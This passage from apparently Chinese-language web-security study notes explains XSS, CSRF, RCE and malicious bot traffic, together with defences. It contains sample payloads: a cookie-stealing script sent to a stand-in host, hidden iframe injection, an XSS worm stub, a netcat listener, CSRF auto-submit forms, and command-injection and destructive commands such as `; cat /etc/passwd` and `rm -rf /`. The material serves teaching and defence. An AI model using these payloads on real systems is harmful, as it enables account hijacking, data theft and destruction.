		cmd.Parameters.Append cmd.CreateParameter("param1", adVarChar, adParamInput, 50, username)
		cmd.Parameters.Append cmd.CreateParameter("param2", adVarChar, adParamInput, 50, password)
		
		' 4. 执行查询，获取结果集
		Set rs = cmd.Execute
		```

- 加强 SQL 数据库服务器的配置与连接

#### XSS 跨站脚本攻击

##### XSS 攻击技术原理

允许用户交互的 Web 应用程序中，用户提交内容中可以包含 HTML、JavaScript 及其他脚本代码，一旦 Web应用程序没有对这些输入的合法性进行有效检查与过滤，就很有可能让这些恶意代码逻辑包含在服务器动态产生或更新的网页中。

```html
<script>alert(/xss/)</script>

<!-->窃取 Cookie</!-->
<script>document.location='http://steal_cookie_exapmle.com/getcookie.php?cookie='+document.cookie;</script>

<!-->植入木马</!-->
<iframe src="http://targer_link" height=0 width=0></iframe>
<script src="http://targer_link"></script>
```

##### XSS 攻击类型

- 持久型 XSS 漏洞（存储型 XSS 漏洞）
    - 原理：若用户输入持久性地保存在 Web 服务器端，并在正常页面中持续性地显示，从而影响所有访问这些页面的其他用户，那么系统很可能存在持久型 XSS 漏洞。
    - 场景：留言板、BBS、博客等

- 非持久型 XSS 漏洞（反射型 XSS 漏洞）
    - 原理：若 Web 浏览器通过 HTTP 请求参数或 HTML 提交表单传递数据，服务器端脚本未对这些数据进行恰当的安全验证与过滤，就直接使用并生成返回给用户的结果页面，那么系统很可能存在非持久型 XSS 漏洞。
    
      - 场景：站点搜索引擎
        1. 攻击者构造一个包含恶意脚本的 `bank.com` 登录请求链接，并通过 Email/HTTP 等方式将该链接发送给其他用户
      
        2. 受害用户点击链接，将会把链接中的恶意脚本当作用户名参数提交给 `bank.com` 的登陆处理网页
      
        3. 由于`bank.com` 登陆处理网页存在 XSS 漏洞，将会在反馈的欢迎页面中包含恶意客户端脚本
      
        4. 攻击者的恶意客户端脚本在受害用户浏览器中执行，通常会驱动浏览器向攻击者发送会话令牌，如会话 ID、Cookie等信息
      
           ```shell
           ## Netcat是攻击者常用的一个工具。运行带有 -l 选项时，它会变成一个监听指定端口的 TCP 服务器。这个服务器会打印出客户端发来的信息，并将用户输入的内容发回给客户端。
           ## 选项 -l 指定 nc 运行一个服务器。选项 -nv 使 nc 输出更详细的信息。选项 -k 表示当一次连接完成后，继续等待其他连接。
           nc -lknv 5555
           ```
      
        5. 攻击者获得用户会话令牌后，就可以劫持用户对话，或者伪造用户登录 `bank.com` ，并可实施进一步攻击
  
- 基于 DOM 的 XSS 漏洞（客户端 XSS 漏洞）

    - 原理：前端 JavaScript 代码将 URL 参数、Hash 值等攻击者可控的输入数据，未经安全过滤或转义就直接用于 DOM 操作（如通过`innerHTML`插入页面、设置`href`属性等），导致恶意脚本被注入并执行；整个过程无需与服务器交互，完全在浏览器客户端完成，本质是前端代码对用户输入的不安全处理，使攻击者能通过构造恶意输入触发脚本执行，进而窃取信息或伪造操作。
    - 场景：URL 参数 / Hash 值处理、`localStorage`/`sessionStorage`本地存储数据处理、 页面交互元素、第三方数据 / 接口返回数据


##### XSS 攻击实例

- 编写实现 XSS 蠕虫

  - 链接方法

    ```html
    <script type="text/javascript" src="http://www.example.com/xss_worm.js">
    </script>
    ```

  - DOM 方法

    ```html
    <script id="worm">
    	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
    	var jsCode = document.getElementById("worm").innerHTML;
     	var tailTag = "</" + "script>";
     	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
    	alert(jsCode);
    </script>
    ```

    

##### XSS 攻击防范措施

- 服务器端防范措施
    - 输入验证：用户输入数据不是过长、仅包含某些合法字符、不能包含某些 HTML 与 JavaScript 关键标签符号、数据与一个特殊的正规表达式相匹配等
    
    - 输出净化：Web 应用程序对提交到响应页面的用户提交数据进行 HTML 编码，用对应的 HTML 实体替代字面量字符
    
    - 消除危险的输入点：尽量避免直接在现有的 JavaScript 中插入用户可控制的数据
    
    - 启用 Content-Security-Policy（CSP）
        - 通过 HTTP 响应头（`Content-Security-Policy`）或 `<meta>` 标签，限制页面可执行的脚本来源（如仅允许自身域名 `'self'`、可信 CDN），禁止内联脚本（`'unsafe-inline'`）和 `eval()` 等危险函数。
        
        - 例：即使注入恶意脚本，也会因来源不被允许而无法执行
        
          ```conf
          Header set Content-Security-Policy " \
          	default-src 'self'; \
          	script-src 'self' 'nonce-111-111-111' *.example70.com \
          	"
        ```
  
- 客户端防范措施
    - 提高浏览器访问非受信网站时的安全等级
    - 关闭 Cookie 功能或设置 Cookie 只读

#### XSRF 跨站请求伪造攻击

##### XSRF 攻击技术原理

利用用户在目标网站已建立的合法会话（如登录状态），诱导用户在不知情的情况下向目标网站发送恶意请求，从而以用户的身份执行未授权操作。其攻击链路依赖于三个关键前提和特定的执行逻辑：

首先，攻击的前置条件包括：用户已成功登录目标网站并保持有效会话（会话信息通常以 Cookie、Session ID 或令牌等形式存储在浏览器中）；用户在会话有效期内访问了攻击者精心构造的恶意页面（如钓鱼网站、包含恶意代码的第三方页面）；目标网站未对请求的合法性进行严格校验，仅通过会话信息确认用户身份。

攻击的执行流程通常为：攻击者分析目标网站的关键操作接口（如转账、修改密码、提交订单等），了解其请求方式（GET/POST）、参数格式和提交路径；随后构造包含恶意请求的页面，该页面可能通过图片标签、表单自动提交、JavaScript 脚本等方式，在用户访问时自动向目标网站发送请求；由于浏览器会在请求中自动携带目标网站的会话 Cookie，目标网站会误认为该请求是用户主动发起的合法操作，进而执行恶意请求中的指令，导致用户权益受损。

##### XSRF 攻击类型

- GET 型 XSRF 攻击：
    - 原理：利用 GET 请求的特性（参数直接拼接在 URL 中）构造恶意链接或资源引用。攻击者通常将恶意请求伪装成图片、链接、iframe 等元素，当用户访问包含这些元素的页面时，浏览器会自动发送 GET 请求。由于 GET 请求一般用于获取资源，部分开发者可能未对其执行的敏感操作进行严格校验，从而导致攻击成功。
    - 例如，某银行转账接口为 GET 方式，URL 格式为 `http://bank.com/transfer?to=attacker&amount=1000`，攻击者构造包含 `<img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">` 的恶意页面，用户登录银行后访问该页面，浏览器会自动加载图片并发送转账请求。
- POST 型 XSRF 攻击：
    - 原理：POST 型攻击相较于 GET 型更具隐蔽性，因为其请求参数包含在请求体中，不直接暴露在 URL 中。攻击者通常通过构造自动提交的表单来发起攻击，利用 JavaScript 脚本在页面加载时触发表单提交，或者诱导用户点击按钮提交表单。由于 POST 请求常被用于提交敏感数据，若网站仅依赖会话验证身份，未对请求来源进行校验，同样会面临风险。
    - 例如，某论坛修改密码的接口为 POST 方式，需要提交“原密码”“新密码”等参数。攻击者构造一个包含隐藏表单的页面，表单 action 指向论坛修改密码接口，参数中“新密码”设为攻击者指定的值，同时通过 JavaScript 代码 `window.onload = function() { document.getElementById("evilForm").submit(); }` 实现页面加载后自动提交，用户登录论坛后访问该页面即会触发密码修改操作。
- 基于 Cookie 的 XSRF 攻击
    - 原理：该类型攻击利用浏览器对 Cookie 的携带规则，尤其是非 HttpOnly 或未设置 SameSite 属性的 Cookie。若目标网站的会话 Cookie 未设置 HttpOnly 标志，攻击者可通过 JavaScript 脚本读取 Cookie 信息并构造请求；若未设置 SameSite 属性，浏览器会在跨站请求中携带 Cookie，为攻击提供便利。此外，部分网站可能使用 Cookie 直接传递操作参数，攻击者可通过篡改 Cookie 或利用 Cookie 中的信息构造恶意请求。

##### XSRF 攻击实例

###### 实例一：电商网站订单篡改攻击

场景：某电商网站存在订单确认接口，采用 GET 方式请求，URL 格式为 `http://ecommerce.com/confirmOrder?orderId=12345&payAmount=999`，用户登录后点击“确认支付”按钮会发送该请求，网站仅通过会话 Cookie 验证用户身份。

攻击过程：攻击者通过分析该接口，发现可通过修改 `payAmount` 参数篡改支付金额。随后，攻击者构造恶意链接 `http://ecommerce.com/confirmOrder?orderId=12345&payAmount=1`，并将其伪装成“限时优惠领取”链接，通过邮件、论坛私信等方式发送给已登录该电商网站的用户。当用户点击该链接时，浏览器会自动发送包含篡改后金额的确认支付请求，网站验证会话有效后，执行支付操作，导致用户以 1 元的价格支付了原价值 999 元的订单，电商网站遭受经济损失。

###### 实例二：社交平台账号权限篡改攻击

场景：某社交平台提供“添加管理员”功能，对应的 POST 接口为 `http://social.com/addAdmin`，请求参数为 `userId=攻击者ID`，用户登录后提交表单即可将指定用户设为账号管理员。该平台未对请求来源进行校验，仅通过会话验证用户身份。

攻击过程：攻击者构造一个恶意 HTML 页面，页面中包含一个隐藏表单，表单 action 指向 `http://social.com/addAdmin`，method 设为 POST，表单内包含 `<input type="hidden" name="userId" value="攻击者ID">` 的隐藏参数。同时，页面中加入 JavaScript 代码实现页面加载后自动提交表单。攻击者将该页面部署在自己的服务器上，并通过“查看精彩内容”等诱导性文案，吸引已登录社交平台的用户访问该页面。用户访问后，浏览器自动提交表单，社交平台验证会话有效后，将攻击者设为账号管理员，攻击者随后可利用管理员权限窃取账号内的隐私信息、发布恶意内容等。

##### XSRF 攻击防范措施

- 使用 CSRF Token 校验
  
  这是目前最主流且有效的防范手段，核心原理是为每个用户会话生成一个唯一的、随机的 CSRF Token（令牌），并在请求中携带该 Token，服务器通过校验 Token 的有效性来判断请求是否合法。具体实现步骤为：服务器在用户登录后，生成一个随机的 CSRF Token，将其存储在用户的会话中，并通过页面渲染（如隐藏表单字段、HTML 头部标签）传递给前端；前端在发起敏感请求（如 POST、PUT、DELETE 等）时，必须将该 Token 作为参数或请求头的一部分发送给服务器；服务器接收请求后，从会话中获取当前用户的 CSRF Token，与请求中携带的 Token 进行对比，若不一致或 Token 不存在，则拒绝执行请求。由于 CSRF Token 是随机且与用户会话绑定的，攻击者无法提前获取，因此无法构造有效的恶意请求。

- 校验请求来源（Referer/Origin 头）
  
  利用 HTTP 协议中的 Referer 头和 Origin 头判断请求的来源是否合法。Referer 头记录了请求发起的页面 URL，Origin 头记录了请求发起的域名（不包含具体路径）。服务器在接收敏感请求时，校验 Referer 或 Origin 头中的域名是否为信任的域名（即自身网站域名），若不是则拒绝请求。需要注意的是，Referer 头可能被浏览器或插件篡改、删除，存在一定的安全隐患，因此建议优先使用 Origin 头（仅在跨站请求中存在），并结合其他防范措施。对于 GET 请求，由于其易被构造，建议尽量避免使用 GET 方式执行敏感操作，从根本上降低风险。

- 设置 Cookie 的 SameSite 属性
  
  通过为会话 Cookie 设置 SameSite 属性，限制浏览器在跨站请求中携带 Cookie，从源头阻止攻击利用 Cookie 进行身份验证。SameSite 属性有三个可选值：Strict（严格模式），浏览器仅在同站请求中携带 Cookie，跨站请求（即使是用户主动点击的链接）也不携带；Lax（宽松模式），比 Strict 模式更灵活，允许用户主动点击链接、提交表单等跨站请求携带 Cookie，但禁止通过图片、脚本等被动方式发起的跨站请求携带 Cookie；None（无限制），浏览器在所有请求中都携带 Cookie，但需配合 Secure 属性（仅在 HTTPS 协议下生效）使用。建议将敏感操作对应的 Cookie 设置为 Strict 或 Lax 模式，有效阻止跨站请求携带 Cookie。

- 其他辅助防范措施
  
  除上述核心措施外，还可通过以下方式增强防护能力：一是采用 HTTP 方法的语义化使用，严格区分 GET 和 POST 等方法的用途，GET 方法仅用于获取资源，不执行任何状态修改或敏感操作，从根本上避免 GET 型 XSRF 攻击；二是实施二次验证，对于转账、修改密码、添加管理员等高危操作，要求用户再次输入密码、验证码或通过手机短信验证等方式，确认用户的操作意图，即使恶意请求通过了前期校验，也能被二次验证拦截；三是使用 HttpOnly Cookie，将会话 Cookie 设置为 HttpOnly 标志，防止攻击者通过 JavaScript 脚本读取 Cookie 信息，避免基于 Cookie 的 XSRF 攻击与 XSS 攻击结合造成更大危害。



#### Shellshock 攻击



#### RCE 漏洞

RCE（Remote Code Execution，远程代码执行）是网络安全领域公认的“高危漏洞之王”，其核心危害在于攻击者无需物理接触目标设备，仅通过网络即可突破安全边界，在目标主机上执行任意自定义代码。这种漏洞一旦被利用，可能直接导致系统被完全控制，因此无论是企业服务器、个人终端还是工业控制系统，都将其列为重点防御对象。

##### RCE的完整定义与本质

从技术定义来看，RCE是指攻击者借助网络连接，利用软件、操作系统或应用程序存在的安全缺陷（如代码逻辑漏洞、输入验证缺失、配置错误等），在目标主机的操作系统或应用运行环境中，成功运行非授权自定义代码的漏洞类型。这里的“远程”强调无需物理接触，“代码执行”则意味着攻击者可直接下达操作指令，而非仅获取数据访问权限。

RCE的本质是“系统执行权限的非法劫持”。正常情况下，系统仅允许经过授权的用户或进程执行代码，且权限范围受严格限制（如普通用户无法修改系统核心配置）。而RCE漏洞打破了这一限制：攻击者通过构造特殊请求触发漏洞后，可获得等同于目标进程的执行权限——若目标进程以管理员权限运行（如部分服务器程序），攻击者就能直接掌控整个系统，实现“远程操控”。

##### RCE的分类及核心区别

- **命令执行漏洞**：攻击者向目标系统注入操作系统原生命令，由操作系统内核直接执行。例如在Linux系统中注入`ls -l`（查看文件列表）、`rm -rf /`（删除所有文件），在Windows系统中注入`dir`（查看目录）、`shutdown -s -t 0`（立即关机）。这类漏洞通常出现在需要调用系统命令的场景，如文件转换工具、远程管理插件等。

- **代码执行漏洞**：攻击者注入特定编程语言的代码（如PHP、Java、Python代码），由应用程序的解释器（如PHP解释器、JVM虚拟机）解释并执行。例如向PHP应用注入`eval('system("ls");')`，若应用未过滤该输入，会由PHP解释器执行其中的系统命令；向Java应用注入恶意Class字节码，由JVM加载执行。这类漏洞多存在于使用动态代码执行功能的应用中。

两者的核心区别在于“执行载体不同”：命令执行漏洞的执行依赖操作系统内核，注入的命令是操作系统可直接识别的原生指令；代码执行漏洞的执行依赖应用程序的运行时环境（如解释器、虚拟机），注入的是编程语言代码，需经过环境解释后才转化为系统可执行的操作。但从危害程度来看，两者完全一致——无论通过哪种方式，攻击者都能实现远程操控，仅利用难度和场景略有差异。

##### 常见触发场景及技术原理

1. **输入验证缺失（最常见场景）**：系统未对用户输入进行严格过滤，直接将输入作为命令/代码的一部分执行。例如某文件查询工具允许用户输入文件名，后台代码为`system("ls " + 用户名输入)`——若用户输入`test.txt; cat /etc/passwd`（Linux系统用户密码文件），拼接后命令变为`ls test.txt; cat /etc/passwd`，系统会先执行ls命令，再执行cat命令泄露敏感信息。这里的`;`是命令连接符，可实现“一条指令执行多个命令”，类似的危险符号还有`|`（管道符，将前命令输出作为后命令输入）、`&&`（逻辑与，前命令成功则执行后命令）等。

2. **危险函数滥用**：应用程序使用了具有代码执行能力的危险函数，且未对函数参数进行权限限制和内容过滤。例如PHP中的`exec()`、`shell_exec()`、`eval()`，Python中的`os.system()`、`subprocess.call()`，Java中的`Runtime.getRuntime().exec()`等。若这些函数的参数直接来源于用户输入（如用户提交的“操作指令”），攻击者即可构造恶意参数触发RCE。例如某Python后台程序用`os.system("ping " + 用户输入的IP)`实现ping测试，用户输入`127.0.0.1; rm -rf /tmp/*`，就会在ping之后删除/tmp目录下的所有文件。

3. **配置不当**：系统或组件的配置存在安全隐患，为攻击者提供可乘之机。常见情况包括：开放不必要的远程管理端口（如SSH默认22端口、RDP默认3389端口暴露在公网）；第三方组件（如MySQL数据库、Tomcat中间件）使用默认管理员账号密码（如MySQL默认账号root、密码空）；服务运行权限过高（如Web服务以root/Administrator权限启动，一旦出现漏洞直接获得最高权限）。例如攻击者通过扫描发现某公网服务器开放SSH端口，且使用弱密码“123456”，登录后即可直接执行系统命令。

4. **软件版本漏洞（“零日漏洞”高发区）**：使用存在已知RCE漏洞的旧版本软件或组件，且未及时更新补丁。这类漏洞由软件开发商的代码缺陷导致，发布后会被黑客快速利用。例如2021年爆发的Log4j2漏洞（CVE-2021-44228），影响全球数十亿Java应用；2017年的Struts2 S2-045漏洞（CVE-2017-5638），导致大量电商、政务系统被攻击；2023年的WinRAR漏洞（CVE-2023-38831），可通过恶意压缩包触发RCE。

##### RCE的危害层级及具体影响

- **一级危害：核心数据泄露与窃取**：攻击者控制目标设备后，可直接访问并下载系统中的敏感数据，包括用户个人信息（身份证号、手机号、密码）、企业商业机密（合同、研发数据、财务报表）、政务数据（公民信息、审批记录）等。例如2022年某车企因RCE漏洞被攻击，导致数十万车主的个人信息泄露；某科研机构服务器被入侵，核心实验数据被窃取。

- **二级危害：设备资源被劫持滥用**：攻击者在目标设备上植入恶意程序，劫持设备的计算资源、存储资源或网络资源。常见场景包括：植入挖矿程序（利用CPU/GPU算力挖矿获利）、植入僵尸网络程序（将设备变为“肉鸡”，参与DDoS攻击）、植入勒索病毒（加密用户文件，索要赎金）。例如2021年 Colonial Pipeline公司因RCE漏洞遭遇勒索病毒攻击，导致美国东海岸燃油供应中断。

- **三级危害：内网横向渗透扩散**：若被攻击的设备处于企业内网或局域网中，攻击者可将其作为“跳板”，利用内网共享权限、弱密码等漏洞，攻击内网其他设备，实现“单点突破、全网沦陷”。例如攻击者通过公网服务器的RCE漏洞进入内网后，进一步攻击数据库服务器、财务服务器、核心业务系统，造成全面损失。

- **四级危害：系统瘫痪与业务中断**：攻击者执行破坏性命令，直接破坏系统运行或删除关键数据，导致服务瘫痪。例如执行`rm -rf /`（Linux）、`del /f /s /q C:\*`（Windows）删除系统文件；修改系统配置文件（如/etc/passwd）导致无法登录；攻击工业控制系统时，甚至可能引发物理设备故障（如工厂生产线停机、电力设备异常）。

##### 典型RCE漏洞案例深度解析

- **Log4j2漏洞（CVE-2021-44228，“史诗级漏洞”）**：
  - 背景：Log4j2是Java生态中最常用的日志组件，全球数十亿Java应用（包括电商平台、金融系统、云服务、物联网设备）均在使用。
  - 漏洞原理：Log4j2的lookup功能支持解析JNDI（Java命名和目录接口）地址，攻击者可通过输入特殊字符串（如`${jndi:ldap://恶意服务器/恶意类}`），让目标应用加载并执行恶意服务器上的Java类，触发RCE。
  - 影响范围：几乎覆盖所有使用Log4j2 2.0-2.14.1版本的应用，包括阿里巴巴、腾讯、百度等国内企业，以及亚马逊、微软等国际巨头的服务，甚至美国军方系统也受影响。
  - 应对措施：紧急更新Log4j2至2.15.0及以上版本，临时方案包括设置系统变量`log4j2.formatMsgNoLookups=true`禁用lookup功能。

- **Struts2 S2-045漏洞（CVE-2017-5638，“Web应用杀手”）**：
  - 背景：Struts2是全球流行的Java Web开发框架，大量政务系统、电商网站基于其开发。
  - 漏洞原理：Struts2的文件上传功能存在输入验证缺陷，攻击者可构造恶意HTTP请求，在文件上传过程中注入OGNL表达式（Struts2的表达式语言），该表达式会被框架解析执行，从而触发RCE。
  - 影响范围：使用Struts2 2.3.5-2.3.31、2.5.0-2.5.10版本的应用均受影响，当时国内多个省级政务平台、银行官网被检测出漏洞。
  - 应对措施：升级Struts2至2.3.32或2.5.12版本，对文件上传接口添加额外验证。

- **路由器弱密码导致的RCE（“家用设备重灾区”）**：
  - 背景：多数家用路由器默认开启远程管理功能，且管理员密码为“admin”“123456”等弱密码，用户未及时修改。
  - 漏洞原理：攻击者通过端口扫描工具（如Nmap）发现开放8080、80等管理端口的路由器，尝试用默认弱密码登录，登录成功后即可通过管理界面执行命令（如修改DNS设置、植入恶意固件），实现RCE。
  - 影响范围：据2023年安全报告，全球约1.2亿台家用路由器存在此风险，攻击者可通过劫持路由器控制家庭内所有设备的网络访问，窃取上网记录或植入广告。
  - 应对措施：修改路由器默认管理员密码，关闭公网可访问的远程管理功能，定期更新路由器固件。


##### 防御核心措施及实施细节

1. **严格输入验证与过滤（“第一道防线”）**：

   - 核心原则：采用“白名单优先”而非“黑名单过滤”——仅允许符合预期格式的输入（如手机号仅允许11位数字），拒绝所有未明确允许的输入。

   - 具体操作：对用户输入的特殊字符（如`; | & && || ` $ ( ) [ ] { } `等）进行转义或过滤；若需调用系统命令，避免直接拼接用户输入，改用“参数化调用”方式（如Python的`subprocess.call(["ping", 用户输入IP])`，即使IP含特殊字符也不会被解析为命令）；对文件上传功能，限制文件类型（通过文件头校验而非后缀名），并将上传文件存储在非Web可访问目录。

2. **禁用/限制危险函数（“代码层防御”）**：

   - 开发规范：明确禁止在代码中使用`eval()`、`exec()`等危险函数，若业务必须使用（如动态脚本执行），需采用“沙箱隔离”技术——将执行环境限制在独立容器中，禁止访问系统核心资源。

   - 环境配置：在编程语言的配置文件中禁用危险函数，如PHP的`php.ini`中设置`disable_functions = eval,exec,shell_exec`；Java应用禁用JNDI的远程类加载功能（针对Log4j2类漏洞）。

3. **及时更新补丁与版本（“漏洞修复核心”）**：

   - 建立机制：定期扫描系统及组件版本（可使用工具如Nessus、OpenVAS），关注厂商发布的安全公告（如Oracle的Critical Patch Update、Apache的安全通知），对存在RCE漏洞的版本在72小时内完成补丁更新。

   - 重点对象：第三方组件（如Log4j2、Struts2、Tomcat）、操作系统（Windows的KB补丁、Linux的yum/apt更新）、物联网设备固件（如路由器、摄像头）。

4. **强化权限管理（“最小权限原则”）**：

   - 账户权限：为不同用户分配最小必要权限，如普通员工账户禁止登录服务器，Web服务使用专用低权限账户（如Linux的www-data用户）运行，禁止以root/Administrator权限启动服务。

   - 配置优化：关闭不必要的服务和端口（如服务器仅开放80/443端口，关闭SSH、RDP等端口的公网访问）；修改第三方组件的默认账号密码（如MySQL、路由器），设置复杂度高的密码（含大小写、数字、特殊字符）；开启账户登录失败锁定机制（如连续5次输错密码锁定30分钟）。

5. **部署多层安全防护（“外部拦截”）**：

   - 网络层：部署WAF（Web应用防火墙，如阿里云WAF、F5 WAF），开启RCE漏洞防护规则（拦截含恶意命令注入的HTTP请求）；部署IDS/IPS（入侵检测/防御系统），监控异常的命令执行行为（如短时间内执行大量`rm`、`cat /etc/passwd`命令）。

   - 终端层：在服务器和终端设备上安装杀毒软件和EDR（终端检测与响应）工具，实时拦截恶意程序植入；对关键系统部署“蜜罐”，模拟存在RCE漏洞的环境，诱捕攻击者并分析攻击行为。

#### 恶意 Bot 流量

Bot（机器人程序）是指通过自动化脚本或程序模拟人类行为与网络服务交互的工具，分为良性 Bot（如搜索引擎爬虫、监控程序）和恶意 Bot（如恶意爬虫、刷接口工具、垃圾邮件发送器等）。此处重点聚焦恶意Bot流量的相关分析。

##### 恶意 Bot 流量的攻击手段

###### 爬虫类 Bot：非法数据采集

此类Bot核心目的是未经授权批量抓取目标网站或应用的内容、数据，常见手段包括：

- 简单无节制爬虫：基于 Python 的 Scrapy、BeautifulSoup 等框架开发，不遵守 robots 协议，以极高频率发送请求，直接占用服务器CPU、带宽资源，导致正常用户访问延迟或服务瘫痪。

- 伪装式爬虫：通过伪造 HTTP 请求头信息（如 User-Agent 模拟浏览器、添加 Referer 伪装来源页面）、使用代理 IP 隐藏真实地址，规避基础反爬机制，深入抓取敏感数据（如用户信息、商业数据、内容素材等）。

- 分布式爬虫：利用大量肉鸡或云服务器组成爬虫集群，分散IP地址和请求来源，同时向目标发起请求，不仅提高爬取效率，还能绕过单 IP 访问频率限制，对服务器造成分布式压力。

- 动态页面爬虫：针对 JavaScript 渲染的动态页面（如 Vue、React 开发的应用），使用 Selenium、Playwright 等工具模拟浏览器加载过程，执行页面脚本后抓取数据，比传统爬虫更难被检测。

###### 刷接口类 Bot：恶意交互与资源消耗

此类 Bot 直接调用目标系统的 API 接口，进行高频次、非正常的交互操作，常见场景包括：

- 接口刷量：针对计数类接口（如文章阅读量、视频播放量、商品点击量），通过循环调用接口伪造数据，破坏数据真实性，影响商业决策或平台生态。

- 恶意注册与登录：调用注册接口批量创建“僵尸账号”，或通过暴力破解（循环尝试账号密码组合）、撞库（利用已泄露的账号密码数据尝试登录）调用登录接口，窃取用户账号控制权。

- 资源抢占与滥用：针对优惠券领取、限量商品抢购等接口，通过提前解析接口参数、优化请求发送逻辑，实现“秒抢”，侵占正常用户权益；或调用云服务、存储等付费接口，造成目标方高额费用损失。

##### 恶意Bot流量的检测方法

Bot 流量检测的核心是区分“机器行为”与“人类行为”，结合技术手段实现多维度识别：

###### 基础行为特征检测

- 访问频率与规律分析：通过日志分析工具（如 ELK、Splunk ）监控单 IP、单账号的请求频率，若短时间内请求次数远超人类操作极限（如每秒数十次），或请求时间间隔固定（机器执行的典型特征），则标记为可疑 Bot。

- 请求头与参数校验：检查 HTTP 请求头中的 User-Agent 是否为异常值（如空白、非标准浏览器标识），Referer 是否与实际访问场景匹配；对于 API 接口，校验请求参数是否符合正常交互逻辑（如缺少必要的前端加密参数、参数值异常）。

- 会话行为分析：人类访问通常会有页面跳转、停留时间等行为，而 Bot 常直接访问目标页面或接口，无关联操作。通过跟踪会话 ID 的访问路径，若存在“直奔目标、无多余交互”的特征，可判定为可疑。

###### 高级身份验证与行为验证

- 验证码验证：针对可疑请求，触发验证码机制（如图形验证码、滑动验证码、短信验证码）。良性用户可正常完成验证，而 Bot 难以通过复杂验证码（如谷歌 reCAPTCHA、极验滑动验证）的识别。

- 设备指纹识别：通过前端脚本收集设备信息（如浏览器指纹、设备型号、操作系统版本、显卡信息等），生成唯一的设备指纹。若同一指纹关联大量 IP 或账号，或指纹信息为虚拟机、自动化工具的典型特征，则标记为 Bot。

- 行为生物特征分析：采集用户操作的生物特征，如鼠标移动轨迹（人类轨迹有随机性，Bot轨迹多为直线或固定路径）、键盘输入速度与间隔（人类输入有波动，Bot 输入均匀），通过机器学习模型区分人机行为。

###### 分布式与智能检测技术

- IP 信誉库匹配：建立或接入第三方 IP 信誉库（如 MaxMind、AbuseIPDB），标记已知的爬虫 IP、代理 IP、恶意 IP 段，若请求来自信誉库中的高危 IP，直接判定为 Bot。

- 机器学习模型检测：基于历史数据（正常用户与Bot的行为数据）训练分类模型（如决策树、随机森林、神经网络），提取请求频率、访问路径、设备特征等多维特征，实时预测请求是否为 Bot，可应对不断变异的 Bot 手段。

- 蜜罐陷阱：在网站或接口中设置“蜜罐链接”或“隐藏接口”，正常人类用户无法访问，而 Bot 会因爬虫逻辑误触，一旦触发则直接标记并拦截。

##### 恶意 Bot 流量的防护策略

###### 前端防护：增加 Bot 访问难度

- 接口参数加密：对前端发送至后端的接口参数进行加密处理（如使用 AES、RSA 加密），并在后端进行解密校验，防止 Bot 直接解析接口参数后调用。

- 动态页面渲染与混淆：对核心数据采用 JavaScript 动态渲染，通过代码混淆（如压缩、变量名加密）增加爬虫解析页面的难度；避免在 HTML 源码中直接暴露敏感数据。

- 前端行为验证：在关键操作（如登录、抢购）前，通过前端脚本验证用户行为（如完成简单的交互操作），未通过验证则不允许调用核心接口。

###### 后端防护：精准拦截恶意请求

- 访问频率限制（限流）：基于IP、账号、设备指纹等维度，通过限流算法（如令牌桶、漏桶算法）限制单位时间内的请求次数，超过阈值则拒绝服务或触发验证。

- 接口权限控制：为 API 接口设置权限等级，对敏感接口（如支付、用户信息查询）要求身份认证（如 Token 认证、OAuth2.0 授权），未授权的请求直接拦截。

- 异常行为拦截：结合检测到的可疑特征（如高危 IP、异常设备指纹、异常访问路径），通过 WAF（Web 应用防火墙）或自定义拦截规则，实时阻断恶意请求。

###### 基础设施与生态防护

- CDN 与反向代理部署：通过 CDN（内容分发网络）或反向代理服务器（如 Nginx、Apache）隐藏服务器真实 IP，同时利用 CDN 的 Bot 管理功能（如阿里云 CDN 的 Bot 防护、Cloudflare 的 Bot Fight Mode）过滤部分恶意 Bot 流量。

- 实时监控与日志分析：搭建实时监控系统，对访问流量、接口调用情况进行实时监控，一旦发现流量异常（如请求量突增），及时触发告警并介入排查；留存详细日志，为后续溯源和规则优化提供数据支持。

- robots 协议规范：在网站根目录放置 robots.txt 文件，明确告知搜索引擎爬虫哪些页面可爬、哪些不可爬，虽无法约束恶意 Bot，但可规范良性爬虫行为，减少无效流量。

### Web 浏览器安全攻防

#### Web 浏览的安全威胁

##### Web 浏览器软件的安全困境三要素

- 复杂性：代码量大漏洞多
- 可扩展性：插件开发缺乏安全保证，插件不具备自动版本更新的机制
- 连通性：始终联网易被网络上的威胁源所攻击利用

##### Web 浏览安全威胁位置

- 针对传输网络的网络协议安全威胁
- 针对 Web 浏览端系统平台的安全威胁
- **针对 Web 浏览器软件及插件程序的渗透攻击威胁** 
- **针对互联网用户的社会工程学攻击威胁**

#### Web 浏览端的渗透攻击威胁——网页木马

##### 网页木马的机理分析

- 网页木马的定义特性：针对 Web 浏览器软件进行客户端渗透攻击的恶意移动代码，利用了现代 Web 浏览器软件中所支持的客户端脚本执行能力，通常以 JavaScript、VBScript 实现，或以 Flash、PDF等恶意构造的 Web 文件形式存在。
- 网页挂马机制//
- 混淆机制

##### 网页木马的检测与分析技术

- 基于特征码匹配的传统检测方法
- 基于统计与机器学习的静态分析方法
- 基于动态行为结果判定的监测分析方法
- 基于模拟浏览器环境的动态分析检测方法

##### 网页木马防范措施



#### 网络钓鱼

##### 网络钓鱼技术概述

##### 网络钓鱼攻击场景案例

##### 网络钓鱼攻击技术策略

##### 网络钓鱼攻击的防范
